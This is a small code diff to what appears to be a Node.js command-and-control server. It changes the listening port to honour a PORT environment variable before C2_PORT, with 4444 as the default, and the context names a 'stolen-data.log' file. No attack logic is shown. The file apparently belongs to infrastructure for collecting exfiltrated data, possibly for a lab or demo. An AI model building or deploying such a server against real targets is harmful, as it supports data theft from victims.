@@ -2,7 +2,7 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 
-const PORT = process.env.C2_PORT || 4444;
+const PORT = process.env.PORT || process.env.C2_PORT || 4444;
 const LOG = path.join(__dirname, 'stolen-data.log');
 
 const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
